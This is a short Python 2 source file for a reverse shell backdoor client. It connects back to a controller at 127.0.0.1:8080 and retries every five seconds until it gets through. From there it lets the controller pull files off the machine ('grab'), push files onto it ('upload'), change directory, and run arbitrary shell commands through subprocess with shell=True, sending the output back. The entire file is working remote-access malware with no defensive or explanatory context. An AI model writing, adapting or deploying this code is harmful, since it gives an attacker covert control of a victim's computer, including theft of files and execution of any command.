
import socket
import subprocess
import os
import time
   
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
def connect():
    try:
        s.connect(('127.0.0.1',8080))
 
    except:
        time.sleep(5)
        connect()

def transferupload(s,command):
    upload,fname=command.split('*')
    path=os.getcwd()+"/"
    path += fname
    f=open(path,'wb+')
    bits=s.recv(1024)
    while True:
        f.write(bits)
                
        if bits.endswith('DONE'):
            f.close()
            break
        bits=s.recv(1024)
        
            
def transfergrab(s,path):
    if os.path.exists(path):
        f=open(path,'rb')
        f.seek(0)
        packet=f.read(1024)
        while packet!='':
            s.send(packet)
            packet=f.read(1024)
        s.send("DONE")
        f.close()
    else:
        s.send("The File Doesn't Exist")
connect()
while True:
    
    command=s.recv(1024)
        
    if 'exit' in command:
        s.close()
        break
            
    elif 'grab' in command:
        grab,path=command.split('*')
        try:
            transfergrab(s,path)
        except Exception,e:
            s.send(str(e))
            pass
    elif 'upload' in command:
        transferupload(s,command)

    elif 'cd' in command:
            code,directory = command.split (' ') 
            os.chdir(directory) 
            s.send( "[+] CWD Is " + os.getcwd() )
            s.send("DONE")

    
        
        
                
    else:
        cmd=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        s.send(cmd.stdout.read())
        s.send(cmd.stderr.read())
        s.send("DONE")
  
